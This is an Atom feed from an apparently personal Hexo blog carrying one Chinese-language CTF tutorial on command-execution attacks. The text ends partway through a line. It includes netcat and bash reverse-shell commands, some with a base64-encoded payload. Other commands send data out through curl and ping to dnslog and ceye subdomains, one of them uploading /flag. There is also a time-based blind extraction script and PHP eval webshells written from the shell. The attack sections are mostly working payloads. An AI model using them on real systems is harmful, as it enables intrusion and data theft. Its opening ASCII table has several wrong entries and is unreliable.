<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>初零·b10g~🥝</title>
  
  
  <link href="https://bowuchuling.github.io/atom.xml" rel="self"/>
  
  <link href="https://bowuchuling.github.io/"/>
  <updated>2024-01-26T07:04:47.774Z</updated>
  <id>https://bowuchuling.github.io/</id>
  
  <author>
    <name>Chu0🥝</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>命令执行总结（修正版）</title>
    <link href="https://bowuchuling.github.io/posts/1837iuw8.html"/>
    <id>https://bowuchuling.github.io/posts/1837iuw8.html</id>
    <published>2024-01-26T05:00:31.307Z</published>
    <updated>2024-01-26T07:04:47.774Z</updated>
    
    <content type="html"><![CDATA[<h1>命令执行</h1><h2 id="ASCII码表完整版">ASCII码表完整版</h2><table><thead><tr><th>ASCII值</th><th>控制字符</th><th>ASCII值</th><th>控制字符</th><th>ASCII值</th><th>控制字符</th><th>ASCII值</th><th>控制字符</th></tr></thead><tbody><tr><td>0</td><td>NUT</td><td>32</td><td>(space)</td><td>64</td><td>@</td><td>96</td><td>、</td></tr><tr><td>1</td><td>SOH</td><td>33</td><td>!</td><td>65</td><td>A</td><td>97</td><td>a</td></tr><tr><td>2</td><td>STX</td><td>34</td><td>”</td><td>66</td><td>B</td><td>98</td><td>b</td></tr><tr><td>3</td><td>ETX</td><td>35</td><td>#</td><td>67</td><td>C</td><td>99</td><td>c</td></tr><tr><td>4</td><td>EOT</td><td>36</td><td>$</td><td>68</td><td>D</td><td>100</td><td>d</td></tr><tr><td>5</td><td>ENQ</td><td>37</td><td>%</td><td>69</td><td>E</td><td>101</td><td>e</td></tr><tr><td>6</td><td>ACK</td><td>38</td><td>&amp;</td><td>70</td><td>F</td><td>102</td><td>f</td></tr><tr><td>7</td><td>BEL</td><td>39</td><td>,</td><td>71</td><td>G</td><td>103</td><td>g</td></tr><tr><td>8</td><td>BS</td><td>40</td><td>(</td><td>72</td><td>H</td><td>104</td><td>h</td></tr><tr><td>9</td><td>HT</td><td>41</td><td>)</td><td>73</td><td>I</td><td>105</td><td>i</td></tr><tr><td>10</td><td>LF</td><td>42</td><td>*</td><td>74</td><td>J</td><td>106</td><td>j</td></tr><tr><td>11</td><td>VT</td><td>43</td><td>+</td><td>75</td><td>K</td><td>107</td><td>k</td></tr><tr><td>12</td><td>FF</td><td>44</td><td>,</td><td>76</td><td>L</td><td>108</td><td>l</td></tr><tr><td>13</td><td>CR</td><td>45</td><td>-</td><td>77</td><td>M</td><td>109</td><td>m</td></tr><tr><td>14</td><td>SO</td><td>46</td><td>.</td><td>78</td><td>N</td><td>110</td><td>n</td></tr><tr><td>15</td><td>SI</td><td>47</td><td>/</td><td>79</td><td>O</td><td>111</td><td>o</td></tr><tr><td>16</td><td>DLE</td><td>48</td><td>0</td><td>80</td><td>P</td><td>112</td><td>p</td></tr><tr><td>17</td><td>DCI</td><td>49</td><td>1</td><td>81</td><td>Q</td><td>113</td><td>q</td></tr><tr><td>18</td><td>DC2</td><td>50</td><td>2</td><td>82</td><td>R</td><td>114</td><td>r</td></tr><tr><td>19</td><td>DC3</td><td>51</td><td>3</td><td>83</td><td>X</td><td>115</td><td>s</td></tr><tr><td>20</td><td>DC4</td><td>52</td><td>4</td><td>84</td><td>T</td><td>116</td><td>t</td></tr><tr><td>21</td><td>NAK</td><td>53</td><td>5</td><td>85</td><td>U</td><td>117</td><td>u</td></tr><tr><td>22</td><td>SYN</td><td>54</td><td>6</td><td>86</td><td>V</td><td>118</td><td>v</td></tr><tr><td>23</td><td>TB</td><td>55</td><td>7</td><td>87</td><td>W</td><td>119</td><td>w</td></tr><tr><td>24</td><td>CAN</td><td>56</td><td>8</td><td>88</td><td>X</td><td>120</td><td>x</td></tr><tr><td>25</td><td>EM</td><td>57</td><td>9</td><td>89</td><td>Y</td><td>121</td><td>y</td></tr><tr><td>26</td><td>SUB</td><td>58</td><td>:</td><td>90</td><td>Z</td><td>122</td><td>z</td></tr><tr><td>27</td><td>ESC</td><td>59</td><td>;</td><td>91</td><td>[</td><td>123</td><td>{</td></tr><tr><td>28</td><td>FS</td><td>60</td><td>&lt;</td><td>92</td><td>/</td><td>124</td><td>|</td></tr><tr><td>29</td><td>GS</td><td>61</td><td>=</td><td>93</td><td>]</td><td>125</td><td>}</td></tr><tr><td>30</td><td>RS</td><td>62</td><td>&gt;</td><td>94</td><td>^</td><td>126</td><td>~</td></tr><tr><td>31</td><td>US</td><td>63</td><td>?</td><td>95</td><td>—</td><td>127</td><td>DEL</td></tr></tbody></table><h2 id="一、系统命令简介">一、系统命令简介</h2><p>系统命令，简单解释就是在系统终端可执行的预定义命令，就是大家常见的黑框框。在linux操作系统中，预定义命令默认存储位置为/bin目录，而windows操作系统的预定义命令默认存储位置为C:\Windows\System32，下面将针对linux和win的系统命令做简单介绍。</p><h3 id="1-1-管道符">1.1 管道符</h3><p>在win和linux这两种操作系统中，我们可以利用管道符来同时执行多条命令</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">windows：</span><br><span class="line">‘<span class="string">|’ 直接执行后面的语句</span></span><br><span class="line">‘<span class="string">||’ 如果前面命令是错的那么就执行后面的语句，否则只执行前面的语句</span></span><br><span class="line">‘<span class="meta">&amp;’ 前面和后面命令都要执行，无论前面真假</span></span><br><span class="line"><span class="meta">&amp;&amp;如果前面为假，后面的命令也不执行，如果前面为真则执行两条命令</span></span><br><span class="line"></span><br><span class="line">linux：</span><br><span class="line">Linux系统包含了windows系统上面四个之外，还多了一个 ‘;’ 这个作用和 ‘<span class="meta">&amp;’ 作用相同</span></span><br></pre></td></tr></table></figure><h3 id="1-2-通配符">1.2 通配符</h3><p>在linux操作系统中支持如下两种通配符</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?   可代替任意一个字符</span><br><span class="line"><span class="bullet">*   </span>可代替0-任意个字符</span><br></pre></td></tr></table></figure><p><strong>例</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">若当前目录只存在一个名为flag的文件</span><br><span class="line"><span class="built_in">cat</span> flag &lt;==&gt; <span class="built_in">cat</span> fla?  &lt;==&gt;  <span class="built_in">cat</span> f*</span><br></pre></td></tr></table></figure><h3 id="1-3-重定向">1.3 重定向</h3><p>在linux操作系统中一共有&gt;和&gt;&gt;两个重定向符号</p><p><strong>1.&gt;符号</strong></p><p>用于将命令的标准输出重定向到指定的文件，如果文件不存在，则会创建文件；如果文件已经存在，则会覆盖文件内容。</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ls</span> &gt; <span class="keyword">file</span>.txt    //将<span class="keyword">ls</span>的执行结果写入<span class="keyword">file</span>.txt中</span><br><span class="line">&gt;<span class="keyword">file</span>.txt        //创建名为<span class="keyword">file</span>.txt的文件</span><br></pre></td></tr></table></figure><p><strong>2.&gt;&gt;符号</strong></p><p>将命令的标准输出重定向到指定的文件，但与<code>&gt;</code> 不同的是，如果文件已经存在，<code>&gt;&gt;</code> 会将输出追加到文件末尾而不是覆盖文件内容。</p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ls</span> &gt;&gt; <span class="keyword">file</span>.txt</span><br></pre></td></tr></table></figure><h3 id="1-4-常见系统命令">1.4 常见系统命令</h3><p>在高级语言当中，系统命令通常需要特定的函数才能执行。例如php中的</p><table><thead><tr><th style="text-align:center">system()</th></tr></thead><tbody><tr><td style="text-align:center">passthru()</td></tr><tr><td style="text-align:center">exec()</td></tr><tr><td style="text-align:center">shell_exec()</td></tr><tr><td style="text-align:center">popen()</td></tr><tr><td style="text-align:center">proc_open()</td></tr><tr><td style="text-align:center">pcntl_exec()</td></tr><tr><td style="text-align:center">``</td></tr></tbody></table><p>python中的例如等</p><table><thead><tr><th style="text-align:center">os.system()</th></tr></thead></table><p>根据函数不同，其所需参数以及回显情况等都会略有不同，需要根据实际情况进行调整</p><h4 id="1-4-1-windows">1.4.1 windows</h4><table><thead><tr><th>命令</th><th>实际效果</th></tr></thead><tbody><tr><td>ipconfig</td><td>主要用来查看当前机器内、外网ip</td></tr><tr><td>type</td><td>type filename 查看文件内容</td></tr><tr><td>cd</td><td>目录跳转</td></tr><tr><td>ping</td><td>ping ip或者url 主要用来判断某机器是否可达</td></tr><tr><td>dir</td><td>列出当前目录</td></tr><tr><td>whoami</td><td>查看当前用户，主要用于判断是否可以命令执行</td></tr></tbody></table><h4 id="1-4-2-linux">1.4.2 linux</h4><p><strong>基础命令</strong></p><table><thead><tr><th>命令</th><th>实际效果</th></tr></thead><tbody><tr><td>ls</td><td>列出当前目录</td></tr><tr><td>cd</td><td>目录跳转</td></tr><tr><td>rm</td><td>删除</td></tr><tr><td>mv</td><td>重命名</td></tr><tr><td>whoami</td><td>查看当前用户</td></tr><tr><td>uname -a</td><td>列出内核版本等详细系统讯息</td></tr><tr><td>ifconfig</td><td>查看当前机器内外网ip</td></tr><tr><td>ping</td><td>判断目标机器是否可达</td></tr><tr><td>touch</td><td>创建文件</td></tr><tr><td>mkdir</td><td>创建目录</td></tr></tbody></table><p>在ctf比赛当中，最常见的就是文件读取命令的绕过，下面是一些常见的<strong>文件读取命令</strong></p><table><thead><tr><th>命令</th><th>实际效果</th></tr></thead><tbody><tr><td>cat</td><td>文件读取</td></tr><tr><td>tac</td><td>文件读取（行倒序输出）</td></tr><tr><td>more</td><td>文件读取（一页一页显示）</td></tr><tr><td>less</td><td>文件读取（一页一页显示，可翻页）</td></tr><tr><td>head</td><td>文件读取（显示头几行）</td></tr><tr><td>tail</td><td>文件读取（显示最后几行）</td></tr><tr><td>nl</td><td>文件读取（会输出行号）</td></tr><tr><td>vim/vi</td><td>文本编辑器，可用于内容查看</td></tr><tr><td>nano</td><td>文本编辑器，可用于内容查看</td></tr><tr><td>emacs</td><td>文本编辑器，可用于内容查看</td></tr><tr><td>sed -n ‘1,10p’</td><td>文件读取（显示前10行）</td></tr><tr><td>rev</td><td>文件读取（倒序输出）</td></tr><tr><td>base64</td><td>文件读取（以base64形式输出）</td></tr><tr><td>strings</td><td>文件读取（提取文件中可输出的字符串）</td></tr><tr><td>xxd</td><td>文件读取（二进制形式输出）</td></tr><tr><td>hexdump</td><td>文件读取（16进制形式输出）</td></tr><tr><td>od</td><td>文件读取（8进制形式输出）</td></tr><tr><td>uniq</td><td>文件读取（会去掉重复行）</td></tr><tr><td>cp</td><td>文件复制（可用于突破目标文件权限限制）</td></tr></tbody></table><h4 id="1-4-3-其它命令">1.4.3 其它命令</h4><p>除了以上的常见命令外还有其它的一些常用命令</p><h5 id="find"><strong>find</strong></h5><p>常用于在linux系统中查找某文件（支持通配符）的具体位置</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">find</span> / -name flag</span><br><span class="line"><span class="built_in">find</span> / -name f*</span><br><span class="line"><span class="built_in">find</span> / -name fla?</span><br><span class="line">/为查找的起始根目录，以上命令会以/（根目录）为查找根目录，在其以及其子目录中查找符合后续命名规则的文件</span><br></pre></td></tr></table></figure><h5 id="sed"><strong>sed</strong></h5><p>在某些情况需要对文件内容进行适当修改，但题目环境并未提供vi等文本编辑器，此时可以利用sed达到精准替换某行的目的</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">实现格式为：</span><br><span class="line">sed -<span class="selector-tag">i</span> <span class="string">&#x27;行数s/原内容/替换为的内容/&#x27;</span> 文件名</span><br><span class="line"></span><br><span class="line">sed -<span class="selector-tag">i</span> <span class="string">&#x27;2s/x\.x\.x\.x/150.158.24.228/&#x27;</span> filename</span><br><span class="line">sed -<span class="selector-tag">i</span> <span class="string">&#x27;3s/7002/7000/&#x27;</span> filename</span><br><span class="line">sed -<span class="selector-tag">i</span> <span class="string">&#x27;4s/.*//&#x27;</span> filename</span><br></pre></td></tr></table></figure><p>PS：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">1</span>.该命令支持通配符</span><br><span class="line"><span class="attribute">2</span>.该命令对于特殊符号需要用\进行转义，如上述的例<span class="number">1</span>中的.</span><br></pre></td></tr></table></figure><h5 id="echo"><strong>echo</strong></h5><p>如果需要大规模写入内容，可以使用base64编码防止数据丢失，再结合echo将内容写入指定文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">实现格式为：</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;base64编码的数据&#x27;</span> | <span class="built_in">base64</span> -d &gt; filename</span><br></pre></td></tr></table></figure><h2 id="二、命令执行">二、命令执行</h2><h3 id="2-1-system类命令执行">2.1 system类命令执行</h3><p>所谓system类命令执行即是原题目已经给出system函数，且其参数是可控的这种情况，下面将以php为例着重讲解该情况下的命令执行方式以及绕过姿势</p><p><strong>示例代码</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;1&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="2-1-1-无回显rce">2.1.1 无回显rce</h4><p>在1.3节开篇我们提到了很多可执行系统命令的函数，他们都可以达成执行系统命令的目的，但其中的一些函数会不会将执行的结果回显，例如exec函数，此时我们就需要通过某些手法得到回显，下面将对这些手法进行详细讲解</p><h5 id="2-1-1-1-反弹shell">2.1.1.1 反弹shell</h5><h6 id="vps简介"><strong>vps简介</strong></h6><p>作为一名合格的web手，一台vps是必不可少的，所谓vps就是一台具有公网ip的服务器，可从下面三方厂家获取</p><p>1.华为云：<a href="https://www.huaweicloud.com/%EF%BC%88%E4%BA%91%E8%80%80%E4%BA%91%E6%9C%8D%E5%8A%A1%E5%99%A8%EF%BC%89">https://www.huaweicloud.com/（云耀云服务器）</a></p><p>2.腾讯云：<a href="https://cloud.tencent.com/%EF%BC%88%E8%BD%BB%E9%87%8F%E5%9E%8B%E6%9C%8D%E5%8A%A1%E5%99%A8%EF%BC%89">https://cloud.tencent.com/（轻量型服务器）</a></p><p>3.阿里云：<a href="https://www.aliyun.com/">https://www.aliyun.com/</a></p><p>服务器和我们个人PC电脑最大的区别就是具有公网ip，实际效果就是任意用户皆可达我们的服务器（可ping通），而个人PC电脑绝大多数情况是无法实现该功能的。详细购买流程以及产品讯息可与对应客服探讨，成功购买后即可使用ssh（服务器自带的远程连接工具）或电脑自带的远程桌面功能进行服务器登录</p><p><strong>1.ssh登录</strong></p><p>ssh软件推荐termius</p><p><img src="..%5C%E7%AC%94%E8%AE%B0%E5%9B%BE%5Cimage-20240123171841669.png" alt="image-20240123171841669"></p><p>从厂家获取账号密码以及公网ip后将其填入1，2，3处，然后点击4处即可远程连接到服务器</p><p><strong>2.电脑自带远程桌面功能登录</strong>（常用于win系统）</p><p><img src="..%5C%E7%AC%94%E8%AE%B0%E5%9B%BE%5Cimage-20240123172206857.png" alt="image-20240123172206857"></p><p><img src="..%5C%E7%AC%94%E8%AE%B0%E5%9B%BE%5Cimage-20240123172217584.png" alt="image-20240123172217584"></p><p>在此界面输入公网ip，稍后再输入厂家给予的账号密码即可登录成功</p><h6 id="反弹手法">反弹手法</h6><p><strong>1.nc反弹</strong></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">正向连接：</span><br><span class="line">linux靶机:nc -e <span class="regexp">/bin/</span>bash -lvvnp 端口</span><br><span class="line">win靶机:nc -e cmd -lvvnp 端口     <span class="regexp">//</span>win系统不自带nc，需要手动上传，此处nc并非固定，根据实际上传的程序名做相应修改</span><br><span class="line">攻击机:nc 靶机ip 端口</span><br><span class="line"></span><br><span class="line">反向连接：</span><br><span class="line">linux靶机:nc -e <span class="regexp">/bin/</span>bash 攻击机ip 端口</span><br><span class="line">win靶机:nc -e cmd 攻击机ip 端口</span><br><span class="line">攻击机:nc -lvvnp 端口</span><br><span class="line"></span><br><span class="line"><span class="regexp">//</span>上述所有操作皆是带有-lvvnp的操作（端口监听）优先</span><br></pre></td></tr></table></figure><p><strong>2.bash反弹</strong></p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">攻击机<span class="symbol">:nc</span> -lvvnp 端口</span><br><span class="line">靶机<span class="symbol">:bash</span> -c <span class="string">&quot;bash -i &gt;&amp; /dev/tcp/攻击机ip/攻击机监听的端口 0&gt;&amp;1&quot;</span></span><br><span class="line">数组版靶机（java源码）<span class="symbol">:bash</span> -c &#123;echo,<span class="title class_">YmFzaCAtaSA</span>+<span class="title class_">JiAvZGV2L3RjcC8xMTAuNDEuMTcuMTgzLzI1MCAwPiYx</span>&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;</span><br><span class="line">//使用时需要对命令中的编码部分解码，将其中的ip和端口修改为攻击机ip段端口后并重新编码才可使用，浏览器传参时需要url编码</span><br></pre></td></tr></table></figure><p>示例演示</p><p>1.在靶机**可达的机器（可ping通，如公网服务器或同网段机器）**上监听端口</p><p><img src="..%5C%E7%AC%94%E8%AE%B0%E5%9B%BE%5Cimage-20240123174432194.png" alt="image-20240123174432194"></p><p>2.在靶机上执行bash反弹命令</p><p><img src="..%5C%E7%AC%94%E8%AE%B0%E5%9B%BE%5Cimage-20240123174611797.png" alt="image-20240123174611797"></p><p>3.查看刚刚监听端口的服务器</p><p><img src="..%5C%E7%AC%94%E8%AE%B0%E5%9B%BE%5Cimage-20240123174641283.png" alt="image-20240123174641283"></p><p>可以发现反弹shell成功，此时可执行任意系统命令</p><p><strong>3.写shell文件后执行</strong></p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">创建<span class="keyword">shell</span>.<span class="keyword">sh</span></span><br><span class="line">bash -<span class="keyword">c</span> <span class="string">&quot;bash -i &gt;&amp; /dev/tcp/服务器ip/端口 0&gt;&amp;1&quot;</span></span><br><span class="line">将上述bash反弹命令写入文件，详见<span class="number">1.2</span>.<span class="number">3</span>节中的<span class="keyword">echo</span>用法</span><br><span class="line">./<span class="keyword">shell</span>.<span class="keyword">sh</span></span><br><span class="line">利用.执行<span class="keyword">shell</span>.<span class="keyword">sh</span>反弹<span class="keyword">shell</span></span><br></pre></td></tr></table></figure><p><strong>正向连接与反向连接简介</strong></p><p><img src="..%5C%E7%AC%94%E8%AE%B0%E5%9B%BE%5Cimage-20240123172902417.png" alt="image-20240123172902417"></p><p>PC1、PC2、PC3为我们的目标机器，此时不难发现三台靶机都处于内网环境</p><p>正向连接：攻击机主动连接靶机</p><p>反向连接：靶机主动连接攻击机</p><p>准则：谁被动，谁监听</p><p>在上述环境中，有且仅有<strong>可访问路由</strong>、<strong>linux外网服务器</strong>、<strong>windows服务器</strong>这三个ip是可访问的，而我们的三台PC靶机此时处于内网环境，相当于我们的个人PC电脑，此时是无法访问的，我们的外网服务器最多只可致<strong>可访问路由</strong>处，即攻击机无法主动连接到靶机，所以此时就无法正向连接。由于我们外网服务器皆为<strong>公网服务器</strong>，所以三台PC靶机是可以访问到服务器的，即可以进行反向连接，让靶机主动连接攻击机，也就是我上面演示的bash反弹的操作。</p><h5 id="2-1-1-2-数据写出">2.1.1.2 数据写出</h5><p>将命令的执行结果写入其他文件，再访问其他文件获取执行结果，下以1.txt为例</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">利用<span class="built_in">cp</span>命令：<span class="built_in">cp</span> flag.php 1.txt</span><br><span class="line"></span><br><span class="line">利用<span class="built_in">mv</span>命令：<span class="built_in">mv</span> flag.php 1.txt</span><br><span class="line"></span><br><span class="line">利用&gt;输出结果到文件：<span class="built_in">ls</span> &gt; 1.txt</span><br><span class="line"></span><br><span class="line">利用<span class="built_in">tee</span>命令：<span class="built_in">ls</span> | <span class="built_in">tee</span> 1.txt    //tee会从从标准输入读取数据，并将其写入文件以及标准输出</span><br><span class="line"></span><br><span class="line">利用script命令：<span class="built_in">ls</span> | script 1.txt  //会开启命令记录，命令执行状态以及结果都将会写入文件中</span><br></pre></td></tr></table></figure><h5 id="2-1-1-3-数据外带">2.1.1.3 数据外带</h5><p>在题目环境出网的条件下，我们可以通过数据外带将命令执行的结果外带出来，此处推荐两个外带网址：</p><p>1.<a href="http://dnslog.cn">http://dnslog.cn</a></p><p>2.<a href="http://ceye.io/%EF%BC%88%E6%8E%A8%E8%8D%90%EF%BC%8C%E6%9B%B4%E7%A8%B3%E5%AE%9A%EF%BC%89">http://ceye.io/（推荐，更稳定）</a></p><p>linux的数据外带归功于其反引号可执行任意系统命令这一特殊机制</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">单行传输：</span><br><span class="line">ping `<span class="built_in">whoami</span>`.dns地址</span><br><span class="line">curl http://dns地址/`<span class="built_in">whoami</span>`</span><br><span class="line"></span><br><span class="line">//whoami即为我们要执行的系统命令，将其用``包裹后利用.将其与我们的dns地址进行拼接，执行命令后即可在dns处得到<span class="built_in">whoami</span>命令的回显</span><br><span class="line"></span><br><span class="line">多行传输：(外带只会显示第一行的数据)</span><br><span class="line">curl http://y91yp4.ceye.io/`<span class="built_in">ls</span> / | <span class="built_in">base64</span>`     //将结果进行<span class="built_in">base64</span>编码后外带出来</span><br><span class="line">curl http://y91yp4.ceye.io/`<span class="built_in">whoami</span> | sed -n <span class="string">&#x27;2p&#x27;</span>`    //输出固定行的结果</span><br><span class="line">curl -T /flag http://y91yp4.ceye.io/      //指定文件外带</span><br></pre></td></tr></table></figure><p>下面我会就这两个外带平台进行演示</p><p><strong>1.dnslog</strong></p><p><img src="..%5C%E7%AC%94%E8%AE%B0%E5%9B%BE%5Cimage-20240123182359664.png" alt="image-20240123182359664"></p><p>首先点击get subdomain，即可获得2所示的url地址，随后即可在靶机执行如下命令</p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ping `whoami`.dns地址</span><br><span class="line">ping `whoami`.b854kz.dnslog.cn</span><br></pre></td></tr></table></figure><p><img src="..%5C%E7%AC%94%E8%AE%B0%E5%9B%BE%5Cimage-20240123182554193.png" alt="image-20240123182554193"></p><p>点几下refresh record（点成get就得重新搞了）即可获得回显，可以得到靶机当前用户为root</p><p><strong>2.ceye</strong></p><p>平台崩了，小寄。</p><p><img src="..%5C%E7%AC%94%E8%AE%B0%E5%9B%BE%5Cimage-20240123183023358.png" alt="image-20240123183023358"></p><p>login处登录后应为profile，在profile出得到url地址后即可执行如下命令</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http:<span class="regexp">//y</span>91yp4.ceye.io<span class="regexp">/`ls /</span> | base64` </span><br></pre></td></tr></table></figure><p>点几下reload即可得到回显结果</p><h5 id="2-1-1-4-盲注">2.1.1.4 盲注</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url=<span class="string">&#x27;http://localhost.test.php/?c=&#x27;</span></span><br><span class="line">dic=string.printable[:-<span class="number">6</span>]</span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    judge=<span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> dic:</span><br><span class="line">        now=<span class="string">f&#x27;<span class="subst">&#123;url&#125;</span>a=$(cat /flag | head -1 | cut -b <span class="subst">&#123;i&#125;</span>);if [ $a = <span class="subst">&#123;j&#125;</span> ];then sleep 2;fi&#x27;</span></span><br><span class="line">        start=time.time()</span><br><span class="line">        r=requests.get(now)</span><br><span class="line">        end=time.time()</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">int</span>(end)-<span class="built_in">int</span>(start) &gt;<span class="number">1</span>:</span><br><span class="line">            judge=<span class="number">1</span></span><br><span class="line">            flag+=j</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> judge==<span class="number">0</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">            </span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><p><strong>核心命令分析</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a=$(<span class="built_in">cat</span> /flag | <span class="built_in">head</span> -1 | <span class="built_in">cut</span> -b &#123;i&#125;);<span class="keyword">if</span> [ <span class="variable">$a</span> = &#123;j&#125; ];<span class="keyword">then</span> <span class="built_in">sleep</span> 2;<span class="keyword">fi</span></span><br></pre></td></tr></table></figure><p><strong>第一部分</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a=$(<span class="built_in">cat</span> /flag | <span class="built_in">head</span> -1 | <span class="built_in">cut</span> -b &#123;i&#125;);</span><br><span class="line">定义变量a，将<span class="built_in">cat</span> /flag的结果利用<span class="built_in">head</span> -1取第一行，利用<span class="built_in">cut</span> -b number取结果的第i（脚本中的循环i）个字符，将字符赋值给a</span><br></pre></td></tr></table></figure><p><strong>第二部分</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">if <span class="selector-attr">[ $a = &#123;j&#125; ]</span>;</span><br><span class="line">判断得到的变量<span class="selector-tag">a</span>是否等于j，j为上述脚本中dic字典的遍历结果</span><br></pre></td></tr></table></figure><p><strong>第三部分</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">then</span> <span class="built_in">sleep</span> 2;<span class="keyword">fi</span></span><br><span class="line">如果判断为真，则睡眠2秒，通过网页是否睡眠判断出flag的每个字母的结果</span><br></pre></td></tr></table></figure><h5 id="2-1-1-5-命令行写shell">2.1.1.5 命令行写shell</h5><p>可以通过命令执行写入shell，然后蚁剑连接，在某些情况会是一个不错的选择</p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml">echo &#x27;PD9waHAgZXZhbCgkX1BPU1RbMV0pOz8=&#x27; | base64 -d &gt; ./123.php  </span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">//base64解码结果为</span><span class="language-php"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="number">1</span>]);<span class="meta">?&gt;</span></span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">echo &#x27;</span><span class="language-php"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(\<span class="variable">$_GET</span>[<span class="number">1</span>]);<span class="title function_ invoke__">phpinfo</span>();<span class="meta">?&gt;</span></span><span class="language-xml">&#x27; &gt; 